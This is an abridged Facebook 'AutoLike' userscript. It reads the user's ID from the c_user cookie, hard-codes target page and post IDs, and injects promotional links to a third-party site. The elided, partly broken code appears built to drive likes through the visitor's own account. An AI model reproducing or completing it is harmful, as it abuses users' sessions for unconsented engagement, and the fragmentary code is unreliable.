// ==UserScript==
// @name			AutoLike The-King
// @namespace		        AutoLike Facebook 
// @description		        *Auto Like From The-King DZ
// @author			http://www.bintangjatuhh.com/
// @authorURL		        http://www.bintangjatuhh.com/
// @updateURL                  https://userscripts.org/scripts/source/185746.meta.js
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='http://www.bintangjatuhh.com' target='_blank' title='NEW' ><blink><center>Web Bintang Jatuhh</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
...
var spage_id = ("587439164627424");
var spost_id = "617995374905136";
var sfoto_id = "";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
...
(function() {
	...
	html += '<h3 class="accessible_elem">Emo Bintang Jatuhh</h3>';
	html += '<div class="uiHeaderActions fsm fwn fcg">';
	html += '<a href="https://www.facebook.com/380952758634913" target="_blank" class="">Like Page</a> Â· <a href="http://www.bintangjatuhh.com/" target="_blank" class="">Bintang Jatuhh</a>';
	html += '</div>';
	html += '</div>';
	html += '<div><h3 class="uiHeaderTitle" aria-hidden="true">Emo Bintang Jatuhh</h3></div>';
	html += '</div>';
	html += '</div>';
	...
	html += '<a class="jewelFooter" href="http://www.facebook.com/1381915717" target="_blank">Bintang Jatuhh</a>';
	html += '</div>';
